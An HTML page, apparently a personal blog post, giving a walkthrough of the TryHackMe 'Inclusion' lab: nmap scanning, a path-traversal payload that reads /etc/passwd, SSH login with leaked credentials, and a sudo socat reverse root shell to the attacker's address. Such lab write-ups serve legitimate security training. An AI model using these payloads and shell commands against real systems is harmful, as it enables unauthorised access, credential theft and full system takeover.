@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Wh0rU</title>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+  <meta content="" name="keywords">
+  <meta content="" name="description">
+
+  <link href="img/tenor.gif" rel="icon">
+  <link href="img/tenor.gif" rel="apple-touch-icon">
+
+  <link href="lib/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+  <link href="lib/font-awesome/css/font-awesome.min.css" rel="stylesheet">
+  <link href="lib/animate/animate.min.css" rel="stylesheet">
+  <link href="lib/ionicons/css/ionicons.min.css" rel="stylesheet">
+  <link href="lib/owlcarousel/assets/owl.carousel.min.css" rel="stylesheet">
+  <link href="lib/lightbox/css/lightbox.min.css" rel="stylesheet">
+
+  <link href="css/style.css" rel="stylesheet">
+
+</head>
+
+<body id="page-top">
+
+
+  <nav class="navbar navbar-b navbar-trans navbar-expand-md fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand js-scroll" href="index.html">Wh0rU</a>
+      <button class="navbar-toggler collapsed" type="button" data-toggle="collapse" data-target="#navbarDefault"
+        aria-controls="navbarDefault" aria-expanded="false" aria-label="Toggle navigation">
+        <span></span>
+        <span></span>
+        <span></span>
+      </button>
+      <div class="navbar-collapse collapse justify-content-end" id="navbarDefault">
+        <ul class="navbar-nav">
+          <li class="nav-item">
+            <a class="nav-link js-scroll active" href="index.html">Home</a>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+  <div id="home" class="intro route bg-image" style="background-image: url(img/inc.png)">
+    <div class="overlay-itro"></div>
+    <div class="intro-content display-table">
+      <div class="table-cell">
+        <div class="container">
+	<center>
+          <h1 class="intro-title mb-4">WriteUp #2</h1>
+          <p class="intro-subtitle"><span class="text-slider-items">TryHackMe,Inclusion</span><strong class="text-slider"></strong></p>
+	</center>
+        </div>
+      </div>
+    </div>
+  </div>
+	<center>
+		<br />
+    <div class="col-md-6">
+                <div class="about-me pt-4 pt-md-0">
+                  <div class="title-box-2">
+                    <h5 class="title-left">
+                      TryHackMe - Inclusion
+                    </h5>
+            <div class="article-content">
+            	<p><span style="color: #ffffff;">Difficulty : <span style="color: #00ff00;">Easy</span></span></p>
+		<p><span style="color: #ffffff;">This is a beginner level room designed for people who want to get familiar with Local file inclusion vulnerability.</span></p>
+		<p><span style="color: #ffffff;">First, let's do a simple enumeration with nmap :</span></p>
+		<p><span style="color: #ffffff;">------------------------------</span></p>
+		<p><span style="color: #ffffff;">nmap -sC -sV -O &lt;machine-ip&gt;</span></p>
+		<p><span style="color: #ffffff;">22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br /><span style="color: #ffffff;">| ssh-hostkey: </span><br /><span style="color: #ffffff;">| 2048 e6:3a:2e:37:2b:35:fb:47:ca:90:30:d2:14:1c:6c:50 (RSA)</span><br /><span style="color: #ffffff;">| 256 73:1d:17:93:80:31:4f:8a:d5:71:cb:ba:70:63:38:04 (ECDSA)</span><br /><span style="color: #ffffff;">|_ 256 d3:52:31:e8:78:1b:a6:84:db:9b:23:86:f0:1f:31:2a (ED25519)</span></p>
+		<p><span style="color: #ffffff;">80/tcp open http Werkzeug httpd 0.16.0 (Python 3.6.9)</span><br /><span style="color: #ffffff;">|_http-title: My blog</span></p>
+		<p><span style="color: #ffffff;">------------------------------</span></p>
+		<p><span style="color: #ffffff;">Port 80 seems interesting, we can see a web page with some informations on Local and remote file inclusion attacks.</span><br /><span style="color: #ffffff;">After clicking on the LFI attacks section, we get that :</span></p>
+		<p><span style="color: #ffffff;">http://10.10.155.28/article?name=lfiattack</span></p>
+		<p><span style="color: #ffffff;">In the URL there&rsquo;s a parameter called name, this indicates that the page we&rsquo;re looking at is actually empty and it&rsquo;s including content from another page.</span><br /><span style="color: #ffffff;">Local File Inclusions are when we are allowed to manipulate the url to open other files.</span></p>
+		<p><span style="color: #ffffff;">Let's try to change the file name on the URL to make a directory traversal attack (we will try with /etc/password file).</span></p>
+		<p><span style="color: #ffffff;">http://&lt;machine-ip&gt;/article?name=../../../../../../etc/passwd</span></p>
+		<p><span style="color: #ffffff;">Then we got the answer we wanted</span></p>
+		<p><span style="color: #ffffff;">------------------------------</span></p>
+		<p>&nbsp;</p>
+		<p><span style="color: #ffffff;">root:x:0:0:root:/root:/bin/bash</span><br /><span style="color: #ffffff;">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br /><span style="color: #ffffff;">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br /><span style="color: #ffffff;">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br /><span style="color: #ffffff;">sync:x:4:65534:sync:/bin:/bin/sync</span><br /><span style="color: #ffffff;">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br /><span style="color: #ffffff;">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br /><span style="color: #ffffff;">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br /><span style="color: #ffffff;">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br /><span style="color: #ffffff;">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br /><span style="color: #ffffff;">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br /><span style="color: #ffffff;">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br /><span style="color: #ffffff;">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br /><span style="color: #ffffff;">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br /><span style="color: #ffffff;">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br /><span style="color: #ffffff;">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br /><span style="color: #ffffff;">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br /><span style="color: #ffffff;">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br /><span style="color: #ffffff;">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin</span><br /><span style="color: #ffffff;">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin</span><br /><span style="color: #ffffff;">syslog:x:102:106::/home/syslog:/usr/sbin/nologin</span><br /><span style="color: #ffffff;">messagebus:x:103:107::/nonexistent:/usr/sbin/nologin</span><br /><span style="color: #ffffff;">_apt:x:104:65534::/nonexistent:/usr/sbin/nologin</span><br /><span style="color: #ffffff;">lxd:x:105:65534::/var/lib/lxd/:/bin/false</span><br /><span style="color: #ffffff;">uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin</span><br /><span style="color: #ffffff;">dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</span><br /><span style="color: #ffffff;">landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin</span><br /><span style="color: #ffffff;">pollinate:x:109:1::/var/cache/pollinate:/bin/false</span><br /><span style="color: #ffffff;">falconfeast:x:1000:1000:falconfeast,,,:/home/falconfeast:/bin/bash</span><br /><span style="color: #ffffff;">#falconfeast:rootpassword </span><br /><span style="color: #ffffff;">sshd:x:110:65534::/run/sshd:/usr/sbin/nologin</span><br /><span style="color: #ffffff;">mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false</span></p>
+		<p><span style="color: #ffffff;">------------------------------</span></p>
+		<p><br /><span style="color: #ffffff;">There are an username and a password in there.</span></p>
+		<p><span style="color: #ffffff;">Use them to connect in ssh :</span></p>
+		<p><span style="color: #ffffff;">ssh falconfeast@10.10.155.28</span></p>
+		<p><span style="color: #ffffff;">----&gt; WE NOW HAVE THE USER FLAG.</span></p>
+		<p><span style="color: #ffffff;">For the privesc part :</span></p>
+		<p><span style="color: #ffffff;">sudo -l</span></p>
+		<p><span style="color: #ffffff;">It will give us informations about our current privileges :</span></p>
+		<p>&nbsp;</p>
+		<p><span style="color: #ffffff;">------------------------------</span></p>
+		<p><span style="color: #ffffff;">Matching Defaults entries for falconfeast on inclusion:</span><br /><span style="color: #ffffff;"> env_reset, mail_badpass,</span><br /><span style="color: #ffffff;"> secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span></p>
+		<p><span style="color: #ffffff;">User falconfeast may run the following commands on inclusion:</span><br /><span style="color: #ffffff;"> (root) NOPASSWD: /usr/bin/socat</span></p>
+		<p><span style="color: #ffffff;">------------------------------</span></p>
+		<p>&nbsp;</p>
+		<p><span style="color: #ffffff;">So, we have sudo access for socat.</span></p>
+		<p><span style="color: #ffffff;">First we will run this command on our machine for sending us the root shell:</span></p>
+		<p><span style="color: #ffffff;">socat file:`tty`,raw,echo=0 tcp-listen:1234</span></p>
+		<p><span style="color: #ffffff;">Now, use this command on the remote machine :</span></p>
+		<p><span style="color: #ffffff;">sudo socat tcp-connect:&lt;your-ip-address&gt;:1234 exec:bash,pty,stderr,setsid,sigint,sane</span></p>
+		<p><span style="color: #ffffff;">----&gt; WE ARE ROOT.</span></p>
+		<p>&nbsp;</p>  
+		</div>
+
+  <a href="#" class="back-to-top"><i class="fa fa-chevron-up"></i></a>
+  <div id="preloader"></div>
+
+    </center>     
+  <!-- JavaScript Libraries -->
+  <script src="lib/jquery/jquery.min.js"></script>
+  <script src="lib/jquery/jquery-migrate.min.js"></script>
+  <script src="lib/popper/popper.min.js"></script>
+  <script src="lib/bootstrap/js/bootstrap.min.js"></script>
+  <script src="lib/easing/easing.min.js"></script>
+  <script src="lib/counterup/jquery.waypoints.min.js"></script>
+  <script src="lib/counterup/jquery.counterup.js"></script>
+  <script src="lib/owlcarousel/owl.carousel.min.js"></script>
+  <script src="lib/lightbox/js/lightbox.min.js"></script>
+  <script src="lib/typed/typed.min.js"></script>
+  <!-- Contact Form JavaScript File -->
+  <script src="contactform/contactform.js"></script>
+
+  <!-- Template Main Javascript File -->
+  <script src="js/main.js"></script>
+
+</body>
+</html>
